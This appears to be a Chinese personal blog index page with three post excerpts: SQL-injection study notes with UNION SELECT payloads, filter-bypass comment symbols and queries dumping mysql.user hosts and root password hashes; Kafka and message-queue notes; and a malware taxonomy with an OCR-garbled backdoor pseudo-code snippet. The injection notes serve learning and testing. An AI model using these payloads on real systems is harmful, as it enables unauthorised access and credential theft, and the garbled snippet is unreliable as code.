<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">| id          |</span><br><span class="line">| user        |</span><br><span class="line">| pass        |</span><br><span class="line">+-------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以要指定数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E and table_schema=0x6D7973716C74657374;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,password from user;</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| user             | password                                  |</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| debian-sys-maint | *764E40048679D21BBB07CB8DDD18465359DAB4CA |</span><br><span class="line">+------------------+-------------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id = &quot;1&quot;;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>常用:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;</span><br><span class="line">&quot;&quot;</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">\</span><br><span class="line">\\</span><br><span class="line">``</span><br><span class="line">%</span><br></pre></td></tr></table></figure>

<p>such as :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from `admin` where id = &quot;1&quot;;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">/**/  /*/**/这样是等效于/**/</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">/*!*/ 内列注释为什么放在这里呢，因为它也可以当作一个空格 /*!/*!*/是等效于/*!*/的</span><br></pre></td></tr></table></figure>

<h1 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a>操作符与逻辑操作符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">:=</span><br><span class="line">||, OR, XOR</span><br><span class="line">&amp;&amp;, AND</span><br><span class="line">NOT</span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line">=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN</span><br><span class="line">|</span><br><span class="line">&amp;</span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line">-, +</span><br><span class="line">*, /, DIV, %, MOD</span><br><span class="line">^</span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line">!</span><br><span class="line">BINARY, COLLATE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="注入产生"><a href="#注入产生" class="headerlink" title="注入产生"></a>注入产生</h1><ol>
<li>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据</li>
<li>过滤不严格</li>
<li>数据库配置不当</li>
<li>转义不当</li>
</ol>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p>数字型，字符型，搜索型,盲注等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = $id; //数字型 注入</span><br><span class="line"></span><br><span class="line">select * from admin where id = &#x27;$id&#x27;; //字符型</span><br><span class="line"></span><br><span class="line">select * from admin where id = &quot;$id&quot;;</span><br><span class="line"></span><br><span class="line">select * from admin where id = ($id);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&#x27;$id&#x27;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = (&quot;$id&quot;);</span><br><span class="line"></span><br><span class="line">select * from admin where username  like &#x27;%adm%&#x27;;</span><br><span class="line"></span><br><span class="line">select * from admin where username  like (&#x27;%adm%&#x27;);</span><br><span class="line"></span><br><span class="line">select * from admin where id = $id limit 0,1;</span><br><span class="line"></span><br><span class="line">select * from admin order by $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by limit 0,1 $id;</span><br><span class="line"></span><br><span class="line">select * from admin order by id limit 1,1 $id;</span><br><span class="line"></span><br><span class="line">insert注入</span><br><span class="line"></span><br><span class="line">update注入</span><br><span class="line"></span><br><span class="line">delete注入</span><br><span class="line"></span><br><span class="line">二次注入</span><br><span class="line"></span><br><span class="line">等等</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="注入注意"><a href="#注入注意" class="headerlink" title="注入注意"></a>注入注意</h1><p>黑盒测试建立在每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，但凡涉及到用户交换地方都将是注入的重灾区</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<h1 id="收集与路径"><a href="#收集与路径" class="headerlink" title="收集与路径"></a>收集与路径</h1><p> <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 5.6.30-1 | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 5.6.30-1 | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">| id   | username       | password |</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">|    1 | admin          | admin    |</span><br><span class="line">|    1 | root@localhost | 3        |</span><br><span class="line">+------+----------------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>路径:<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<h1 id="用户-链接信息"><a href="#用户-链接信息" class="headerlink" title="用户,链接信息"></a>用户,链接信息</h1><p><code>system_user() </code> &#x2F;&#x2F;系统用户名<br><code>user() </code>  &#x2F;&#x2F; 用户名<br><code>current_user()</code>  &#x2F;&#x2F;当前用户名<br><code>session_user()</code> &#x2F;&#x2F;链接数据库的用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">| id                 | username           | password |</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">| 1                  | Dumb               | Dumb     |</span><br><span class="line">| root@192.168.1.101 | root@192.168.1.101 | root@%   |</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读取host与user</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">| id | username  | password |</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">|  1 | Dumb      | Dumb     |</span><br><span class="line">|  1 | %         | root     |</span><br><span class="line">|  1 | 127.0.0.1 | root     |</span><br><span class="line">|  1 | ::1       | root     |</span><br><span class="line">|  1 | localhost | root     |</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/12/MYSQL-SQL/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/11/kafka/" >消息队列中间件</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-11  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="kafka-events"><a href="#kafka-events" class="headerlink" title="kafka events"></a>kafka events</h1><ul>
<li>internet of things</li>
<li>user interaction</li>
<li>and so on</li>
</ul>
<p><strong>“kafka events &#x3D; Notification + State”(key and value)</strong></p>
<h1 id="序列化-and-反序列化"><a href="#序列化-and-反序列化" class="headerlink" title="序列化 and 反序列化"></a>序列化 and 反序列化</h1><ul>
<li>序列化格式：JSON&#x2F;JSON_Schema&#x2F;Avro&#x2F;Protobuf …</li>
<li>序列化对象值：应用程序或对象的表示或者某种东西的信息</li>
<li>kafka keys：系统中某个实体的状态</li>
</ul>
<h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><ul>
<li>topic is named container for similar events</li>
<li>durable logs of events</li>
<li>events are immutable</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">logs 是 kafka 作为基础组件使用的核心</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分区（partitioning）"><a href="#分区（partitioning）" class="headerlink" title="分区（partitioning）"></a>分区（partitioning）</h2><ul>
<li>topic 为完全存在一台机器上，作为集群的一个结点</li>
<li>partitioning 采用单个主题日志，将日志划分为多个主题（将topic分解），如果 topic 拥有 value 通过散列函数 输出模块的 partitioning 要写入分区号</li>
</ul>
<h2 id="brokers-经纪人"><a href="#brokers-经纪人" class="headerlink" title="brokers (经纪人)"></a>brokers (经纪人)</h2><ul>
<li>an computer, instance,or container,runing the kafka process</li>
<li>Manage partitions</li>
<li>Handle write and read requests</li>
<li>Manage replication of partitions</li>
</ul>
<h2 id="replication"><a href="#replication" class="headerlink" title="replication"></a>replication</h2><ul>
<li>copies of data for fault tolerance</li>
<li>one load partition and N-1 followers</li>
<li>In general,writes and reads happen to the leader</li>
<li>An invisible process to most developers</li>
<li>Yunable in the Producer</li>
</ul>
<h2 id="Producer"><a href="#Producer" class="headerlink" title="Producer"></a>Producer</h2><ul>
<li>管理连接池</li>
<li>进行网络缓冲</li>
<li>等待代理确认消息</li>
<li>释放缓冲区空间</li>
<li>容错的重新传输消息</li>
</ul>
<p><strong>轮询无密钥、没有密钥、散列密钥来计算目标分区、自定义配置方案</strong></p>
<h2 id="consumer"><a href="#consumer" class="headerlink" title="consumer"></a>consumer</h2><ul>
<li>阅读消息不会破坏kafka，仍然可供使用</li>
<li>扩展消费者，提供任意数量的消费者之间的交付订单的能力</li>
</ul>
<h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><ul>
<li>其他系统要进入kafka topic，kafka topic 进入其他系统，这是kafka connect work</li>
<li>connect &#x3D; output + input</li>
<li>生产为源连接器，消费为同步连接器</li>
</ul>
<h2 id="schema-Registry"><a href="#schema-Registry" class="headerlink" title="schema Registry"></a>schema Registry</h2><ul>
<li>schema Registry 是一个独立的服务器进程，运行在kafka代理之外的机器上，负责维护写入其负责的集群中主题的所有模式的数据库，在冗余的高可用性配置中运行模式注册表。</li>
<li>schema Registry 是 API ， 允许生产者和消费者预测</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用REST接口</span><br><span class="line"></span><br><span class="line">supported Formats : JSON_Schema/Avro/Protocol Buffers (change IDL , end write AVSC docs)</span><br></pre></td></tr></table></figure>

<h2 id="kafka-stream"><a href="#kafka-stream" class="headerlink" title="kafka stream"></a>kafka stream</h2><ul>
<li><p>消费者越来越复杂，很快就会变成复杂的聚合和丰富的各种疯狂的事情。由于 consumer API 没有支持所有需要大量代码去构建框架来处理TimeWindows、迟到的消息、乱序消息、查找表、按键聚合等。</p>
</li>
<li><p>聚合等操作是有状态的，可意味着是一个在程序堆中分配的内存其实是个容错任务（设计部署一个内存数据网格并且可以高效的放入和取出）所以kafka stream的作用</p>
</li>
<li><p>kafka stream 像消费者群体就是一个消费者组。可以自动进行横向扩展在此基础上建立并解决诸多有意思的问题</p>
</li>
</ul>
<h2 id="KsqlDB"><a href="#KsqlDB" class="headerlink" title="KsqlDB"></a>KsqlDB</h2><ul>
<li>A database optimized for stream processing</li>
<li>runs on its own scalable,fault-tolerant cluster adhacent to the kafka cluster</li>
<li>stream processing programs written in SQL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">command line interface</span><br><span class="line"></span><br><span class="line">REST API for application intergration</span><br><span class="line"></span><br><span class="line">Java library</span><br><span class="line"></span><br><span class="line">kafka connect intergration</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>KsqlDB 旨在提供一个易于使用且熟悉的界面，为大多数基于kafka的流处理应用程序工作负载，提供一个单一的思维模型</strong></p>
<h2 id="消息队列项目"><a href="#消息队列项目" class="headerlink" title="消息队列项目"></a>消息队列项目</h2><ul>
<li>kafka</li>
</ul>
<p>kafka 某种形式上的消息队列数据库</p>
<ul>
<li>pulsar</li>
</ul>
<p>pulsar 是一个云原生的分布式消息传递和流媒体平台，最主要的特点就是存储分离，pulsar 更像是连接的消息管道，bookkeeper 作为持久消息存储，因为这就有点像 database，可以形成存储分分布式集群，当然可以叫做持久消息存储。对了 pulsar 的多租户，支持隔离，认证，授权，隔离和配额，这个很有意思的事情是，身份认证的策略，puslar 用了这种“套接字形式”去保证消息管道的安全性，这个或许有点用，但是仍然需要好的身份验证策略，类似于 eBPF 中 cilium 这种项目的策略会很 nice.题外话，pulsar 代码越来越多，越来越重，看着有点繁 。</p>
<ul>
<li>rocketmq</li>
</ul>
<p>rocketmq 是一个分布式消息和流媒体平台，具有低延迟、高性能、可靠性、万亿级容量和灵活的扩展性。这个就不太像说点啥了，阿里内部跑出来的消息，有大量的数据量考验，不过云原生方面有点落后了</p>
<ul>
<li>redpanda</li>
</ul>
<p>redpanda 是一个用于关键工作负载的流媒体平台，兼容kafka，不需zk（去zk是个趋势，需要大数据项目都在去zk，尤其是hadoop生态区逐渐弱化，大数据体系变得更加 open），无需 JVM，最终要的 Wasm 技术&#x2F;地理复制分层存储的流传输并且是 C++ 编写，这个很让我惊喜因为一直以为大数据只能 Java，但是发现越来越多的大数据用其他语言编写，C++ 但是出来的东西很偏向 “01010101” 上的大数据内层发展。</p>
<h2 id="消息队列常见应用场景"><a href="#消息队列常见应用场景" class="headerlink" title="消息队列常见应用场景"></a>消息队列常见应用场景</h2><h3 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h3><p><strong>案例：</strong>邮件注册，串行或并行</p>
<ol>
<li>串行也就是说“一个一个来做”</li>
<li>并行也就是说“全部同时来做”</li>
</ol>
<p>（并发量、吞吐量、响应时间）会有局限，也就是可以引入异步处理，即弱化不必要的业务逻辑，改为异步逻辑结构</p>
<h3 id="应用解耦"><a href="#应用解耦" class="headerlink" title="应用解耦"></a>应用解耦</h3><p><strong>案例：</strong>支付消息通知存储，调用其接口</p>
<ol>
<li>当无法访问时，可能会存在耦合</li>
</ol>
<p>（消息队列可作为‘中间人’，一端完成持久化处理，另一端采用拉&#x2F;推的方式）</p>
<h3 id="流量削锋"><a href="#流量削锋" class="headerlink" title="流量削锋"></a>流量削锋</h3><p><strong>案例：</strong>流量峰值过大，防止应用挂掉</p>
<ol>
<li>控制活动人数，缓解短时间的高流量，用户请求服务器接收后，首先写入消息队列</li>
</ol>
<h3 id="日志处理"><a href="#日志处理" class="headerlink" title="日志处理"></a>日志处理</h3><p><strong>案例：</strong>将消息队列用在日志处理中</p>
<ol>
<li>日志采集客户端，负责日志数据采集，定时写入消息–&gt; 负责日志数据接收、存储和转发–&gt;日志处理应用–&gt;订阅并消费队列中的日志数据</li>
</ol>
<h5 id="消息流程"><a href="#消息流程" class="headerlink" title="消息流程"></a>消息流程</h5><ul>
<li>接收消息队列 –&gt; 日志解析（logstash） –&gt; 实时日志分析（elasticsearch） –&gt; 消息可视化（kibana）</li>
</ul>
<h3 id="聊天通讯"><a href="#聊天通讯" class="headerlink" title="聊天通讯"></a>聊天通讯</h3><p><strong>案例：</strong>点对点以及发布订阅模式</p>
<h2 id="JVM-常见内容"><a href="#JVM-常见内容" class="headerlink" title="JVM  常见内容"></a>JVM  常见内容</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-1.html">JVM规范</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.credera.com/insights/modern-data-architecture-an-overview-of-lambda-and-kappa-architectures">数仓架构</a>，<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/azure-global/azure-data-architecture-guide-blog-4-hybrid-data-architecture/ba-p/306579">混合数据架构</a></p>
</li>
</ul>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/11/kafka/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/11/malware_01/" >恶意软件逻辑框架</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-11  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h3 id="Trojan-Horse"><a href="#Trojan-Horse" class="headerlink" title="Trojan Horse:"></a>Trojan Horse:</h3><p>There was no love lost between the Greeks and the Trojans. The Greeks had<br>besieged the Trojans, holed up in the city of Troy, for ten years. They finally<br>took the city by using a clever ploy: the Greeks built an enormous wooden horse,<br>concealing soldiers inside, and tricked the Trojans into bringing the horse into<br>Troy. When night fell, the soldiers exited the horse and much unpleasantness<br>ensued.</p>
<p>In computing, a Trojan horse is a program which purports to do some benign<br>task, but secretly performs some additional malicious task. A classic example is<br>a password-grabbing login program which prints authentic-looking “username”<br>and “password” prompts, and waits for a user to type in the information. When<br>this happens, the password grabber stashes the information away for its creator,<br>then prints out an “invalid password” message before running the real login<br>program. The unsuspecting user thinks they made a typing mistake and reenters<br>the information, none the wiser.</p>
<h3 id="Logic-Bomb"><a href="#Logic-Bomb" class="headerlink" title="Logic Bomb:"></a>Logic Bomb:</h3><p>The oldest type of malicious software.  This program is embedded with some other program.  When certain condition meets, the logic bomb will destroy your pc.<br>It also crash at particular date which is fixed by attacer.  It will be included in legitimate or authorized person like this:</p>
<h3 id="Back-Door-or-Trap-Door"><a href="#Back-Door-or-Trap-Door" class="headerlink" title="Back Door or Trap Door:"></a>Back Door or Trap Door:</h3><p>A back door is any mechanism which bypasses a normal security check. Programmers<br>sometimes create back doors for legitimate reasons, such as skipping<br>a time-consuming authentication process when debugging a network server.<br>As with logic bombs, back doors can be placed into legitimate code or be<br>standalone programs.</p>
<blockquote>
</blockquote>
<p>username &#x3D; read_username()<br>password &#x3D; read_password()<br>if tisername i s “133t h4ck0r”:<br>return ALLOW^LOGIN<br>if username and password are valid:<br>return ALLOW_LOGIN<br>e l s e:<br>return DENY^LOGIN</p>
<p>One special kind of back door is a RAT, which stands for Remote Administration<br>Tool or Remote Access Trojan, depending on who’s asked. These programs<br>allow a computer to be monitored and controlled remotely;</p>
<blockquote>
</blockquote>
<p>Virus:<br>Self-replicating: yes<br>Population growth: positive<br>Parasitic: yes</p>
<p>A virus is malware that, when executed, tries to replicate itself into other executable<br>code; when it succeeds, the code is said to be infected. The infected<br>code, when run, can infect new code in turn. This self-replication into existing<br>executable code is the key defining characteristic of a virus.<br>Types of Virus</p>
<blockquote>
</blockquote>
<p>1.Parasitic virus:<br>   Traditional and common virus.  This will be attached with EXE files and search for other EXE file to infect them.<br>2. Memory Resident Virus:<br>    Present in your system memory as a system program.  From here onwards it will infects all program that executes.<br>3. Boot Sector Virus:<br>     Infects the boot record and spread when the system is booted from the disk containing the virus.<br>4. Stealth Virus:<br>     This virus hides itself from detection of antivirus scanning.</p>
<h3 id="Worm"><a href="#Worm" class="headerlink" title="Worm:"></a>Worm:</h3><p>A worm shares several characteristics with a virus. The most important characteristic<br>is that worms are self-replicating too, but self-replication of a worm<br>is distinct in two ways. First, worms are standalone, and do not rely on other<br>executable code. Second, worms spread from machine to machine across networks.</p>
<h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit:"></a>Rabbit:</h3><p>Rabbit is the term used to describe malware that multiplies rapidly. Rabbits<br>may also be called bacteria, for largely the same reason.</p>
<p>There are actually two kinds of rabbit.The first is a program which tries<br>to consume all of some system resource, like disk space. A “fork bomb,” a<br>program which creates new processes in an infinite loop, is a classic example<br>of this kind of rabbit. These tend to leave painfully obvious trails pointing to<br>the perpetrator, and are not of particular interest.</p>
<p>The second kind of rabbit, which the characteristics above describe, is a<br>special case of a worm. This kind of rabbit is a standalone program which<br>replicates itself across a network from machine to machine, but deletes the<br>original copy of itself after replication. In other words, there is only one copy<br>of a given rabbit on a network; it just hops from one computer to another.<br>Rabbits are rarely seen in practice.</p>
<h3 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware:"></a>Spyware:</h3><p>Spyware is software which collects information from a computer and transmits<br>it to someone else.</p>
<blockquote>
</blockquote>
<p>The exact information spyware gathers may vary, but can include anything<br>which potentially has value:<br>1 Usernames and passwords. These might be harvested from files on the<br>machine, or by recording what the user types using a key logger. A keylogger<br>differs from a Trojan horse in that a keylogger passively captures keystrokes<br>only; no active deception is involved.<br>2 Email addresses, which would have value to a spammer.<br>3 Bank account and credit card numbers.<br>4 Software license keys, to facilitate software pirating.</p>
<h3 id="Adware"><a href="#Adware" class="headerlink" title="Adware:"></a>Adware:</h3><p>Adware has similarities to spyware in that both are gathering information about<br>the user and their habits. Adware is more marketing-focused, and may pop up<br>advertisements or redirect a user’s web browser to certain web sites in the hopes<br>of making a sale. Some adware will attempt to target the advertisement to fit<br>the context of what the user is doing. For example, a search for “Calgary” may<br>result in an unsolicited pop-up advertisement for “books about Calgary.”<br>Adware may also gather and transmit information about users which can be<br>used for marketing purposes. As with spyware, adware does not self-replicate.</p>
<h3 id="Zombies"><a href="#Zombies" class="headerlink" title="Zombies:"></a>Zombies:</h3><p>Computers that have been compromised can be used by an attacker for a<br>variety of tasks, unbeknownst to the legitimate owner; computers used in this<br>way are called zombies. The most common tasks for zombies are sending spam<br>and participating in coordinated, large-scale denial-of-service attacks.</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>传染机制：</strong>病毒、木马、蠕虫</p>
<p><strong>有效载荷：</strong>系统损坏、僵尸程序、网络钓鱼、间谍软件、rootkit</p>
<h3 id="malware-package"><a href="#malware-package" class="headerlink" title="malware package"></a>malware package</h3><p><em><strong>高级持续威胁：商业性荷政治性目标、使用多种入侵技术和恶意软件，并在很长一段时间内发起持续有效的攻击的网络犯罪</strong></em></p>
<p><em><strong>adware 广告软件：集成在软件中的广告程序，能够产生弹出式广告或将浏览器重定向到某个商业网站</strong></em></p>
<p><em><strong>attack kit 攻击工具包：通过使用各种传播和载荷机制自动生成新恶意软件的工具</strong></em></p>
<p><em><strong>auto rooter：用于远程入侵新的机器上的恶意攻击工具</strong></em></p>
<p><em><strong>后门：能够绕过正常安全检查的任何机制，可以允许未经授权访问某些功能</strong></em></p>
